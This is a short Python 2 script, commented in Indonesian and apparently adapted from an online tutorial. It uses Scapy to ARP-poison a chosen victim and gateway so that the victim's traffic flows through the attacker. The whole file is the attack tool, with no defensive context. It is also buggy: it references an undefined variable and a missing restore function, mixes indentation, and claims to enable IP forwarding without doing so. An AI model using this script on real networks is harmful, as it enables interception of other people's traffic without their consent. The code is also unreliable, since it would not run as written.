from scapy.all import * #untuk melakukan MITM, module ini paling penting
import os
import time
import sys

#tahap pertama yang perlu kita lakukan adalah menginput IP dan MacAdd dari target
try:
	interface = raw_input("[*] input interface: ")
	victimIP = raw_input("[*] input victim ip: ")
	gateIP = raw_input("[*] input gate/router ip: ")
except KeyboardInterrupt:
    print "/n[*] User Requested Shutdown"
	print "[*] Exiting..."
	sys.exit(1)

print "[*] Enabling IP forwarding........"

def get_mac(IP):
    conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)

    for ans,unans in ans:
        return rcv.sprintf(r"%Ether.src%")

def reARP():
    print "[*] Restoring target.."
	victimMac = get_mac(victimIP)
	gateMac = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMac), count = 5)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMac), count = 5)
	
	print "[*] Restored & exiting..."
	sys.exit(1)

def trick(gateMac, victimMac):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = victimMac))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = gateMac))

def arpp():
	try:
		victimMac = get_mac(victimIP)
	except Exception:
		print "[*] Couldn't find Victim Mac Address and exiting.."
		sys.exit(1)
	
	try:
		gateMac = get_mac(gateIP)
	except Exception:
		print "[*] Couldn't find Victim Gate/router Address and exiting.."
		sys.exit(1)
	
	print "[*] Poisoning target!!"
	
	while 1:
		try:
			trick(gateMac, victimMac)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reArp_target()
			break

arpp()

#ref:
# Kelas Online Ko Irvan
# https://null-byte.wonderhowto.com/how-to/build-man-middle-tool-with-scapy-and-python-0163525/